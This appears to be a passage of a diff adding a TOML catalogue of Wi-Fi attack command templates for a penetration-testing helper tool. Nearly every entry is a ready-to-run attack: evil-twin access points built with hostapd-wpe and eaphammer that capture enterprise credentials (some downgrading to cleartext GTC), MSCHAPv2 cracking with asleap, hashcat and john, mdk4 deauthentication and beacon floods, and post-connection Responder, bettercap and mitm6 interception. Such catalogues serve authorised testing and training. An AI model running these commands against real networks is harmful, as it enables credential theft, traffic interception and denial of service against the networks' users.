+template = "sudo airtun-ng -a {bssid} -p '{password}' {mon_iface}"
+requires = ["airtun-ng"]
+tags = ["tunnel", "airtun"]
+
+[[command]]
+id = "wifi.airserv"
+title = "airserv-ng — remote interface server"
+template = "sudo airserv-ng -d wlan0 -p 6666"
+requires = ["airserv-ng"]
+tags = ["airserv", "remote"]
+
+[[command]]
+id = "wifi.tkiptun"
+title = "tkiptun-ng — WPA-TKIP chopchop tunnel"
+template = "sudo tkiptun-ng -a {bssid} -h {station} -x 1000 -y 1000 -w 1 -m 1500 -k 00:11:22:33:44:55 {mon_iface}"
+requires = ["tkiptun-ng"]
+tags = ["tkip", "wpa"]
+
+# === WPA2 / WPA3 Enterprise (802.1X / EAP) ===
+
+[[command]]
+id = "wifi.iw.scan.enterprise"
+title = "iw scan — detect 802.1X / EAP networks"
+template = "iw dev {iface} scan dump | grep -E 'SSID|RSN|WPA|Authentication suites|AKM:8021X|Suite B|SAE|signal'"
+requires = ["iw"]
+tags = ["enum", "enterprise", "eap", "802.1x"]
+
+[[command]]
+id = "wifi.hostapd_wpe"
+title = "hostapd-wpe — rogue AP (EAP capture, WPA2-Enterprise)"
+template = "sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf"
+requires = ["hostapd-wpe"]
+tags = ["enterprise", "wpa2", "eap", "rogue"]
+
+[[command]]
+id = "wifi.hostapd_wpe.wpa3"
+title = "hostapd-wpe — WPA3-Enterprise rogue (edit conf: wpa=2 wpa_key_mgmt=WPA-EAP ieee80211w=2)"
+template = "sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe-wpa3.conf"
+requires = ["hostapd-wpe"]
+tags = ["enterprise", "wpa3", "eap", "rogue"]
+
+[[command]]
+id = "wifi.hostapd_wpe.conf.wpa2"
+title = "hostapd-wpe — generate WPA2-Enterprise template"
+template = """cat > /tmp/hostapd-wpe.conf <<'EOF'
+interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+wpa=2
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+ieee80211w=1
+eap_server=1
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.pem
+private_key_passwd=whatever
+dh_file=/etc/hostapd-wpe/certs/dh
+EOF
+echo 'Edit paths above, then: sudo hostapd-wpe /tmp/hostapd-wpe.conf'"""
+requires = ["hostapd-wpe"]
+tags = ["enterprise", "wpa2", "eap", "config"]
+
+[[command]]
+id = "wifi.hostapd_wpe.conf.wpa3"
+title = "hostapd-wpe — generate WPA3-Enterprise template (SAE + EAP transition)"
+template = """cat > /tmp/hostapd-wpe-wpa3.conf <<'EOF'
+interface={iface}
+driver=nl80211
+ssid={ssid}
+hw_mode=g
+channel={channel}
+wpa=2
+wpa_key_mgmt=WPA-EAP-SHA256 SAE
+wpa_pairwise=GCMP-256 CCMP
+rsn_pairwise=GCMP-256 CCMP
+ieee80211w=2
+beacon_prot=1
+eap_server=1
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.pem
+private_key_passwd=whatever
+dh_file=/etc/hostapd-wpe/certs/dh
+EOF
+echo 'Edit paths above, then: sudo hostapd-wpe /tmp/hostapd-wpe-wpa3.conf'"""
+requires = ["hostapd-wpe"]
+tags = ["enterprise", "wpa3", "eap", "config"]
+
+[[command]]
+id = "wifi.freeradius_wpe"
+title = "freeradius-wpe — standalone rogue RADIUS (EAP relay)"
+template = "sudo freeradius-wpe"
+requires = ["freeradius-wpe"]
+tags = ["enterprise", "eap", "radius", "rogue"]
+
+[[command]]
+id = "wifi.eaphammer.creds"
+title = "eaphammer — WPA2-Enterprise cred capture (PEAP)"
+template = "sudo eaphammer --bssid {bssid} --essid '{ssid}' --channel {channel} --interface {iface} --auth wpa-eap --creds --pmf disable"
+requires = ["eaphammer"]
+tags = ["enterprise", "wpa2", "eap", "peap", "evil-twin"]
+
+[[command]]
+id = "wifi.eaphammer.wpa3_eap"
+title = "eaphammer — WPA3-Enterprise-like cred capture (wpa-eap + PMF require)"
+template = "sudo eaphammer --bssid {bssid} --essid '{ssid}' --channel {channel} --interface {iface} --auth wpa-eap --creds --pmf require"
+requires = ["eaphammer"]
+tags = ["enterprise", "wpa3", "eap", "evil-twin"]
+
+[[command]]
+id = "wifi.eaphammer.peap"
+title = "eaphammer — PEAP/MSCHAPv2 downgrade evil twin"
+template = "sudo eaphammer --bssid {bssid} --essid '{ssid}' --channel {channel} --interface {iface} --auth wpa-eap --creds --negotiate weakest --pmf disable"
+requires = ["eaphammer"]
+tags = ["enterprise", "wpa2", "peap", "mschapv2", "evil-twin"]
+
+[[command]]
+id = "wifi.eaphammer.ttls"
+title = "eaphammer — EAP-TTLS PAP capture"
+template = "sudo eaphammer --bssid {bssid} --essid '{ssid}' --channel {channel} --interface {iface} --auth wpa-eap --creds --negotiate balanced --pmf disable"
+requires = ["eaphammer"]
+tags = ["enterprise", "wpa2", "ttls", "evil-twin"]
+
+[[command]]
+id = "wifi.eaphammer.gtc"
+title = "eaphammer — EAP-GTC (cleartext password) capture"
+template = "sudo eaphammer --bssid {bssid} --essid '{ssid}' --channel {channel} --interface {iface} --auth wpa-eap --creds --negotiate gtc-downgrade --pmf disable"
+requires = ["eaphammer"]
+tags = ["enterprise", "eap", "gtc", "evil-twin"]
+
+[[command]]
+id = "wifi.eaphammer.cert_wizard"
+title = "eaphammer — generate rogue CA/server certs"
+template = "sudo eaphammer --cert-wizard"
+requires = ["eaphammer"]
+tags = ["enterprise", "eap", "certs"]
+
+[[command]]
+id = "wifi.eaphammer.known_beacon"
+title = "eaphammer — known-beacon attack (auto-connect lure)"
+template = "sudo eaphammer --interface {iface} --channel {channel} --essid '{ssid}' --known-beacons --auth wpa-eap --creds --pmf disable"
+requires = ["eaphammer"]
+tags = ["enterprise", "eap", "known-beacon", "evil-twin"]
+
+[[command]]
+id = "wifi.eaphammer.hcxdump"
+title = "eaphammer — capture EAPOL for offline analysis"
+template = "sudo eaphammer --bssid {bssid} --essid '{ssid}' --channel {channel} --interface {iface} --auth wpa-eap --capture-wpa-handshakes yes --pmf disable"
+requires = ["eaphammer"]
+tags = ["enterprise", "eap", "capture"]
+
+[[command]]
+id = "wifi.asleap"
+title = "asleap — crack captured MSCHAPv2 (LEAP/PEAP phase2)"
+template = "asleap -C CHALLENGE -R RESPONSE"
+requires = ["asleap"]
+tags = ["enterprise", "eap", "mschapv2", "crack"]
+
+[[command]]
+id = "wifi.hashcat.netntlmv1"
+title = "hashcat — mode 5500 (NetNTLMv1 from EAP capture)"
+template = "hashcat -m 5500 netntlmv1.hashes {wordlist} --status"
+requires = ["hashcat"]
+tags = ["enterprise", "eap", "mschapv2", "hashcat"]
+
+[[command]]
+id = "wifi.hashcat.netntlmv2"
+title = "hashcat — mode 5600 (NetNTLMv2 from PEAP/TTLS)"
+template = "hashcat -m 5600 netntlmv2.hashes {wordlist} --status"
+requires = ["hashcat"]
+tags = ["enterprise", "eap", "mschapv2", "hashcat"]
+
+[[command]]
+id = "wifi.john.chap"
+title = "john — MSCHAPv2 (asleap/jumbo format)"
+template = "john --wordlist={wordlist} --format=netntlm mschap.hashes"
+requires = ["john"]
+tags = ["enterprise", "eap", "mschapv2", "john"]
+
+[[command]]
+id = "wifi.tshark.eap"
+title = "tshark — enumerate EAP types in capture"
+template = "tshark -r {cap} -Y 'eap' -T fields -e frame.number -e wlan.sa -e eap.type -e eap.code"
+requires = ["tshark"]
+tags = ["analyze", "enterprise", "eap"]
+
+[[command]]
+id = "wifi.tshark.eap.identity"
+title = "tshark — extract EAP identities (Identity Response)"
+template = "tshark -r {cap} -Y 'eap.type == 1 && eap.code == 2' -T fields -e wlan.sa -e eap.identity"
+requires = ["tshark"]
+tags = ["analyze", "enterprise", "eap", "identity"]
+
+[[command]]
+id = "wifi.wpa_supplicant.enterprise"
+title = "wpa_supplicant — connect WPA2-Enterprise (legit creds)"
+template = """cat > /tmp/wpa-enterprise.conf <<EOF
+network={{
+    ssid="{ssid}"
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity="{user}"
+    password="{password}"
+    phase2=\"auth=MSCHAPV2\"
+    ca_cert=\"/etc/ssl/certs/ca-certificates.crt\"
+}}
+EOF
+sudo wpa_supplicant -B -i {iface} -c /tmp/wpa-enterprise.conf && sleep 3 && sudo dhclient {iface}"""
+tags = ["postex", "enterprise", "wpa2", "connect"]
+
+[[command]]
+id = "wifi.wpa_supplicant.wpa3_enterprise"
+title = "wpa_supplicant — connect WPA3-Enterprise (Suite-B / SHA256)"
+template = """cat > /tmp/wpa3-enterprise.conf <<EOF
+network={{
+    ssid="{ssid}"
+    key_mgmt=WPA-EAP-SHA256
+    eap=PEAP
+    identity="{user}"
+    password="{password}"
+    phase2=\"auth=MSCHAPV2\"
+    ieee80211w=2
+    ca_cert=\"/etc/ssl/certs/ca-certificates.crt\"
+}}
+EOF
+sudo wpa_supplicant -B -i {iface} -c /tmp/wpa3-enterprise.conf && sleep 3 && sudo dhclient {iface}"""
+tags = ["postex", "enterprise", "wpa3", "connect"]
+
+[[command]]
+id = "wifi.evil_twin.dnsmasq"
+title = "dnsmasq — DHCP/DNS for rogue AP (edit paths)"
+template = "sudo dnsmasq -C /tmp/dnsmasq-wifi.conf -d"
+requires = ["dnsmasq"]
+tags = ["evil-twin", "enterprise", "dhcp"]
+
+[[command]]
+id = "wifi.hostapd.conf"
+title = "hostapd — run with local conf"
+template = "sudo hostapd /tmp/hostapd-wifi.conf"
+requires = ["hostapd"]
+tags = ["rogue", "evil-twin"]
+
+[[command]]
+id = "wifi.chain.enterprise.evil_twin"
+title = "chain: eaphammer cred capture + Responder on {iface}"
+template = """sudo eaphammer --bssid {bssid} --essid '{ssid}' --channel {channel} --interface {iface} --auth wpa-eap --creds --pmf disable &
+sleep 5
+sudo responder -I {iface} -wd"""
+requires = ["eaphammer", "responder"]
+tags = ["chain", "enterprise", "wpa2", "evil-twin", "postex"]
+
+# === Automation ===
+
+[[command]]
+id = "wifi.wifite"
+title = "wifite — automated audit (all modes)"
+template = "sudo wifite"
+requires = ["wifite"]
+tags = ["auto", "wifite"]
+
+[[command]]
+id = "wifi.wifite.wpa"
+title = "wifite — WPA only"
+template = "sudo wifite --wpa"
+requires = ["wifite"]
+tags = ["auto", "wifite", "wpa"]
+
+[[command]]
+id = "wifi.wifite.wps"
+title = "wifite — WPS only"
+template = "sudo wifite --wps"
+requires = ["wifite"]
+tags = ["auto", "wifite", "wps"]
+
+[[command]]
+id = "wifi.wifite.pmkid"
+title = "wifite — PMKID mode"
+template = "sudo wifite --pmkid"
+requires = ["wifite"]
+tags = ["auto", "wifite", "pmkid"]
+
+[[command]]
+id = "wifi.mdk4.deauth"
+title = "mdk4 — deauth flood"
+template = "sudo mdk4 {mon_iface} d -B {bssid}"
+requires = ["mdk4"]
+tags = ["deauth", "mdk4"]
+
+[[command]]
+id = "wifi.mdk4.beacon"
+title = "mdk4 — beacon flood (DoS)"
+template = "sudo mdk4 {mon_iface} b -n '{ssid}'"
+requires = ["mdk4"]
+tags = ["dos", "mdk4"]
+
+# === Post-exploitation (connected / cracked) ===
+
+[[command]]
+id = "wifi.wpa_supplicant"
+title = "wpa_supplicant — connect with PSK"
+template = """wpa_passphrase '{ssid}' '{password}' | sudo tee /tmp/wpa.conf \\
+ && sudo wpa_supplicant -B -i {iface} -c /tmp/wpa.conf \\
+ && sleep 3 && sudo dhclient {iface}"""
+tags = ["postex", "connect"]
+
+[[command]]
+id = "wifi.nmcli.connect"
+title = "nmcli — connect to open/WPA network"
+template = "nmcli dev wifi connect '{ssid}' password '{password}' ifname {iface}"
+requires = ["nmcli"]
+tags = ["postex", "connect", "nm"]
+
+[[command]]
+id = "wifi.ip.addr"
+title = "ip — address and routes after connect"
+template = "ip addr show {iface}; ip route; ip neigh show dev {iface}"
+requires = ["ip"]
+tags = ["postex", "enum"]
+
+[[command]]
+id = "wifi.nmap.gateway"
+title = "nmap — gateway /24 after WiFi join"
+template = "GW=$(ip route | awk '/default/{print $3; exit}') && nmap -sn ${GW%.*}.0/24"
+requires = ["nmap"]
+tags = ["postex", "recon"]
+
+[[command]]
+id = "wifi.nmap.full_lan"
+title = "nmap — full TCP on discovered gateway subnet"
+template = "GW=$(ip route | awk '/default/{print $3; exit}') && nmap -sS -T4 -Pn --top-ports 1000 -sV ${GW%.*}.0/24"
+requires = ["nmap"]
+tags = ["postex", "recon"]
+
+[[command]]
+id = "wifi.tcpdump"
+title = "tcpdump — traffic on connected iface"
+template = "sudo tcpdump -i {iface} -w {capture}.pcap"
+requires = ["tcpdump"]
+tags = ["postex", "capture"]
+
+[[command]]
+id = "wifi.responder.wifi"
+title = "Responder — LLMNR/NBT-NS on WiFi iface"
+template = "sudo responder -I {iface} -wd"
+requires = ["responder"]
+tags = ["postex", "credential", "responder"]
+
+[[command]]
+id = "wifi.bettercap"
+title = "bettercap — MITM on {iface}"
+template = "sudo bettercap -iface {iface}"
+requires = ["bettercap"]
+tags = ["postex", "mitm"]
+
+[[command]]
+id = "wifi.bettercap.captive"
+title = "bettercap — captive portal + dns spoof"
+template = "sudo bettercap -iface {iface} -caplet http-ui/captive"
+requires = ["bettercap"]
+tags = ["postex", "captive", "mitm"]
+
+[[command]]
+id = "wifi.mitm6.wifi"
+title = "mitm6 — IPv6 DNS takeover on WiFi"
+template = "sudo mitm6 -i {iface} -d {domain}"
+requires = ["mitm6"]
+tags = ["postex", "ipv6", "ad"]
+
+[[command]]
+id = "wifi.airmon.restore"
+title = "airmon-ng stop + restart NetworkManager"
+template = "sudo airmon-ng stop {mon_iface} && sudo systemctl start NetworkManager"
+requires = ["airmon-ng"]
+tags = ["postex", "cleanup"]
